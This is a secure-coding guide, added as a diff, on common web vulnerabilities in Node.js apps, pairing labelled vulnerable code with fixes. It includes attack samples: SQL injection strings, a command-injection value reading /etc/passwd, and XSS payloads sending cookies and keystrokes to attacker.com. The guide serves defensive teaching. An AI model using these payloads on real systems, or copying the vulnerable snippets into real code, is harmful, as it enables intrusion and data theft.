@@ -1,0 +1,598 @@
+# Essential to know
+- SQL injection: use parameterized queries
+- XSS: sanitize output, use CSP
+- CSRF: use tokens or SameSite cookies
+- Always validate and sanitize input
+
+---
+
+# Common Vulnerabilities
+
+## OWASP Top 10 (2021)
+
+The Open Web Application Security Project (OWASP) maintains a list of the most critical security risks. Here are the top concerns for web applications:
+
+1. Broken Access Control
+2. Cryptographic Failures
+3. Injection (SQL, NoSQL, OS command)
+4. Insecure Design
+5. Security Misconfiguration
+6. Vulnerable and Outdated Components
+7. Identification and Authentication Failures
+8. Software and Data Integrity Failures
+9. Security Logging and Monitoring Failures
+10. Server-Side Request Forgery (SSRF)
+
+## Injection Attacks
+
+### SQL Injection (SQLi)
+
+The most dangerous and common web vulnerability. Attackers inject malicious SQL code through user input.
+
+#### Vulnerable Code
+
+```javascript
+// ❌ NEVER DO THIS
+app.get('/users', async (req, res) => {
+  const { id } = req.query;
+  const query = `SELECT * FROM users WHERE id = ${id}`;
+  const result = await db.query(query);
+  res.json(result);
+});
+
+// Attacker sends: ?id=1 OR 1=1--
+// Result: SELECT * FROM users WHERE id = 1 OR 1=1--
+// Returns ALL users!
+```
+
+#### Attack Examples
+
+```sql
+-- Basic bypass
+' OR '1'='1
+
+-- Union attack (extract data)
+' UNION SELECT username, password FROM admin_users--
+
+-- Delete data
+'; DROP TABLE users;--
+
+-- Time-based blind injection
+' OR SLEEP(5)--
+
+-- Extract database version
+' UNION SELECT @@version,null,null--
+```
+
+#### Prevention: Parameterized Queries
+
+```javascript
+// ✅ SAFE - Using parameterized queries
+app.get('/users', async (req, res) => {
+  const { id } = req.query;
+  
+  // PostgreSQL
+  const result = await db.query(
+    'SELECT * FROM users WHERE id = $1',
+    [id]  // Parameters sent separately from query
+  );
+  
+  // MySQL
+  const result = await db.query(
+    'SELECT * FROM users WHERE id = ?',
+    [id]
+  );
+  
+  res.json(result.rows);
+});
+```
+
+#### ORM Protection
+
+```javascript
+// ✅ SAFE - ORMs automatically parameterize
+// Prisma
+const user = await prisma.user.findUnique({
+  where: { id: parseInt(req.query.id) }
+});
+
+// Sequelize
+const user = await User.findByPk(req.query.id);
+
+// TypeORM
+const user = await userRepository.findOne({
+  where: { id: req.query.id }
+});
+```
+
+### NoSQL Injection
+
+```javascript
+// ❌ VULNERABLE
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  const user = await db.collection('users').findOne({
+    username: username,
+    password: password
+  });
+});
+
+// Attacker sends: {"username": {"$ne": null}, "password": {"$ne": null}}
+// Returns first user in database!
+
+// ✅ SAFE
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  
+  // Validate input types
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    return res.status(400).json({ error: 'Invalid input' });
+  }
+  
+  const user = await db.collection('users').findOne({
+    username: username.toString()
+  });
+  
+  // Verify password separately with bcrypt
+  const valid = await bcrypt.compare(password, user.passwordHash);
+});
+```
+
+### Command Injection
+
+```javascript
+// ❌ VULNERABLE
+app.get('/ping', (req, res) => {
+  const { host } = req.query;
+  exec(`ping -c 4 ${host}`, (error, stdout) => {
+    res.send(stdout);
+  });
+});
+
+// Attacker sends: ?host=google.com; cat /etc/passwd
+// Executes: ping -c 4 google.com; cat /etc/passwd
+
+// ✅ SAFE
+import { execFile } from 'child_process';
+
+app.get('/ping', (req, res) => {
+  const { host } = req.query;
+  
+  // Validate and sanitize
+  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
+    return res.status(400).json({ error: 'Invalid hostname' });
+  }
+  
+  // Use execFile with array arguments (no shell interpretation)
+  execFile('ping', ['-c', '4', host], (error, stdout) => {
+    res.send(stdout);
+  });
+});
+```
+
+## Cross-Site Scripting (XSS)
+
+XSS allows attackers to inject malicious scripts into web pages viewed by other users.
+
+### Types of XSS
+
+#### 1. Stored XSS (Persistent)
+```
+Attacker submits malicious script → Stored in database → 
+Served to all users viewing the page
+```
+
+#### 2. Reflected XSS (Non-Persistent)
+```
+Attacker sends link with script → User clicks → 
+Server reflects script in response → Executes in user's browser
+```
+
+#### 3. DOM-based XSS
+```
+Attacker manipulates URL fragment → JavaScript reads fragment → 
+Malicious script executes on client side
+```
+
+### XSS Attack Examples
+
+```html
+<!-- Steal cookies -->
+<script>
+  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+</script>
+
+<!-- Keylogger -->
+<script>
+  document.onkeypress = function(e) {
+    fetch('https://attacker.com/log?key=' + e.key)
+  }
+</script>
+
+<!-- Defacement -->
+<script>
+  document.body.innerHTML = '<h1>HACKED</h1>'
+</script>
+
+<!-- Phishing -->
+<script>
+  document.body.innerHTML = '<form action="https://attacker.com/phish">...</form>'
+</script>
+```
+
+### XSS Prevention
+
+#### Output Encoding
+
+```javascript
+// ❌ VULNERABLE
+app.get('/search', (req, res) => {
+  const { q } = req.query;
+  res.send(`<h1>Results for: ${q}</h1>`);
+});
+
+// Attacker: ?q=<script>alert('XSS')</script>
+
+// ✅ SAFE - Escape output
+function escapeHtml(unsafe) {
+  return unsafe
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/\"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
+app.get('/search', (req, res) => {
+  const { q } = req.query;
+  res.send(`<h1>Results for: ${escapeHtml(q)}</h1>`);
+});
+```
+
+#### Using Template Engines
+
+```javascript
+// Most template engines auto-escape by default
+// EJS
+<h1>Results for: <%= query %></h1>  // Escaped
+<h1>Results for: <%- query %></h1>  // Unescaped (DANGEROUS)
+
+// Pug/Jade
+h1 Results for: #{query}  // Escaped
+h1 Results for: !{query}  // Unescaped (DANGEROUS)
+
+// Handlebars
+<h1>Results for: {{query}}</h1>  // Escaped
+<h1>Results for: {{{query}}}</h1>  // Unescaped (DANGEROUS)
+```
+
+#### Content Security Policy (CSP)
+
+```javascript
+// Prevent inline scripts
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'"],  // No 'unsafe-inline'
+    styleSrc: ["'self'", "'unsafe-inline'"]
+  }
+}));
+
+// Use nonces for inline scripts
+app.use((req, res, next) => {
+  res.locals.nonce = crypto.randomBytes(16).toString('hex');
+  next();
+});
+
+// In template
+<script nonce="<%= nonce %>">
+  // This inline script is allowed
+</script>
+```
+
+#### DOMPurify for Rich Content
+
+```javascript
+import DOMPurify from 'isomorphic-dompurify';
+
+// Allow safe HTML (e.g., user comments with formatting)
+const dirty = req.body.comment;
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
+  ALLOWED_ATTR: []  // No attributes allowed
+});
+
+// Store and display 'clean'
+```
+
+## Cross-Site Request Forgery (CSRF)
+
+Forces users to execute unwanted actions on a web application where they're authenticated.
+
+### Attack Scenario
+
+```
+1. User logs into bank.com (session cookie set)
+2. User visits evil.com in another tab
+3. evil.com has: <img src="https://bank.com/transfer?to=evil&amount=1000" />
+4. Browser automatically includes bank.com cookies
+5. Bank processes the transfer
+```
+
+### CSRF Prevention
+
+#### Synchronizer Token Pattern
+
+```javascript
+// Server generates token
+app.get('/form', (req, res) => {
+  const csrfToken = generateToken();
+  req.session.csrfToken = csrfToken;
+  res.render('form', { csrfToken });
+});
+
+// Client includes token in requests
+app.post('/action', (req, res) => {
+  if (req.body.csrfToken !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+  }
+  // Process action...
+});
+```
+
+#### SameSite Cookies
+
+```javascript
+res.cookie('sessionId', token, {
+  sameSite: 'strict',  // Block all cross-site requests
+  secure: true,
+  httpOnly: true
+});
+
+// Or for compatibility
+sameSite: 'lax'  // Block POST/PUT/DELETE from other sites
+```
+
+#### Double Submit Cookie
+
+```javascript
+// Set cookie on page load
+app.get('/', (req, res) => {
+  const csrfToken = generateToken();
+  res.cookie('csrf-token', csrfToken, {
+    httpOnly: false,  // JavaScript can read it
+    sameSite: 'strict'
+  });
+  res.render('page', { csrfToken });
+});
+
+// Verify cookie matches header
+app.post('/action', (req, res) => {
+  const cookieToken = req.cookies['csrf-token'];
+  const headerToken = req.headers['x-csrf-token'];
+  
+  if (cookieToken !== headerToken) {
+    return res.status(403).json({ error: 'CSRF validation failed' });
+  }
+});
+```
+
+## Broken Authentication
+
+### Common Vulnerabilities
+
+#### 1. Weak Passwords
+```javascript
+// Enforce strong passwords
+const passwordSchema = z.string()
+  .min(12, 'Password must be at least 12 characters')
+  .regex(/[A-Z]/, 'Must contain uppercase')
+  .regex(/[a-z]/, 'Must contain lowercase')
+  .regex(/[0-9]/, 'Must contain number')
+  .regex(/[^A-Za-z0-9]/, 'Must contain special character');
+```
+
+#### 2. Brute Force Attacks
+```javascript
+// Implement rate limiting
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  message: 'Too many login attempts'
+});
+
+app.use('/auth/login', loginLimiter);
+```
+
+#### 3. Session Fixation
+```javascript
+// Regenerate session ID on login
+app.post('/auth/login', async (req, res) => {
+  const user = await authenticateUser(req.body);
+  
+  // Prevent session fixation
+  req.session.regenerate((err) => {
+    if (err) throw err;
+    req.session.userId = user.id;
+    res.json({ success: true });
+  });
+});
+```
+
+#### 4. Insecure Password Storage
+```javascript
+// Always hash passwords
+const hashedPassword = await bcrypt.hash(password, 12);
+
+// Verify with timing-safe comparison
+const valid = await bcrypt.compare(inputPassword, storedHash);
+```
+
+## Security Misconfiguration
+
+### Common Mistakes
+
+#### Default Credentials
+```javascript
+// ❌ NEVER use defaults
+const defaultAdmin = {
+  username: 'admin',
+  password: 'admin123'
+};
+
+// ✅ Force password change on first login
+if (user.isFirstLogin) {
+  return res.redirect('/change-password');
+}
+```
+
+#### Debug Information Leakage
+```javascript
+// ❌ DON'T leak stack traces
+app.use((err, req, res, next) => {
+  res.status(500).json({
+    error: err.message,
+    stack: err.stack  // Remove in production!
+  });
+});
+
+// ✅ Generic error in production
+app.use((err, req, res, next) => {
+  console.error(err);  // Log internally
+  res.status(500).json({
+    error: process.env.NODE_ENV === 'production'
+      ? 'Internal server error'
+      : err.message
+  });
+});
+```
+
+#### Exposed Sensitive Files
+```javascript
+// Block access to sensitive files
+app.use('/.env', (req, res) => res.status(403).end());
+app.use('/.git', (req, res) => res.status(403).end());
+app.use('/config', (req, res) => res.status(403).end());
+```
+
+## Insecure Dependencies
+
+### Keeping Dependencies Updated
+
+```bash
+# Check for vulnerabilities
+npm audit
+
+# Fix automatically
+npm audit fix
+
+# Check for updates
+npm outdated
+
+# Update all
+npm update
+```
+
+### Using npm audit in CI/CD
+
+```yaml
+# .github/workflows/security.yml
+name: Security Audit
+on: [push, pull_request]
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-node@v3
+      - run: npm ci
+      - run: npm audit --audit-level=moderate
+```
+
+### Lock Files
+
+```bash
+# Always use lock files for reproducible builds
+npm install  # Creates package-lock.json
+
+# In CI/production
+npm ci  # Uses exact versions from lock file
+```
+
+## Server-Side Request Forgery (SSRF)
+
+Forces the server to make requests to unintended locations.
+
+```javascript
+// ❌ VULNERABLE
+app.get('/fetch-image', async (req, res) => {
+  const { url } = req.query;
+  const response = await fetch(url);  // Attacker can access internal services
+  const buffer = await response.buffer();
+  res.send(buffer);
+});
+
+// Attacker: ?url=http://localhost:3000/admin/users
+// Server fetches internal admin panel!
+
+// ✅ SAFE - Validate and restrict URLs
+app.get('/fetch-image', async (req, res) => {
+  const { url } = req.query;
+  
+  // Parse URL
+  const parsed = new URL(url);
+  
+  // Whitelist allowed domains
+  const allowedDomains = ['cdn.example.com', 'images.example.com'];
+  if (!allowedDomains.includes(parsed.hostname)) {
+    return res.status(400).json({ error: 'Domain not allowed' });
+  }
+  
+  // Block private IP ranges
+  const ip = await dns.resolve4(parsed.hostname);
+  if (isPrivateIP(ip[0])) {
+    return res.status(400).json({ error: 'Private IP not allowed' });
+  }
+  
+  // Only allow specific protocols
+  if (parsed.protocol !== 'https:') {
+    return res.status(400).json({ error: 'Only HTTPS allowed' });
+  }
+  
+  const response = await fetch(url);
+  // ...
+});
+```
+
+## Security Checklist
+
+### Development Phase
+- [ ] Use parameterized queries for all database access
+- [ ] Validate and sanitize all user input
+- [ ] Escape output in HTML templates
+- [ ] Implement proper authentication and session management
+- [ ] Use CSRF tokens for state-changing operations
+- [ ] Set secure HTTP headers
+- [ ] Implement rate limiting
+- [ ] Use HTTPS everywhere
+- [ ] Keep dependencies updated
+- [ ] No secrets in code or logs
+
+### Testing Phase
+- [ ] Run security scanners (npm audit, Snyk)
+- [ ] Perform penetration testing
+- [ ] Test for XSS, SQLi, CSRF
+- [ ] Review authentication flows
+- [ ] Check access controls
+- [ ] Verify input validation
+- [ ] Test error handling
+
+### Production Phase
+- [ ] Use production environment flags
+- [ ] Enable security headers
+- [ ] Set up monitoring and alerting
+- [ ] Implement logging
+- [ ] Use WAF (Web Application Firewall)
+- [ ] Regular security audits
+- [ ] Incident response plan
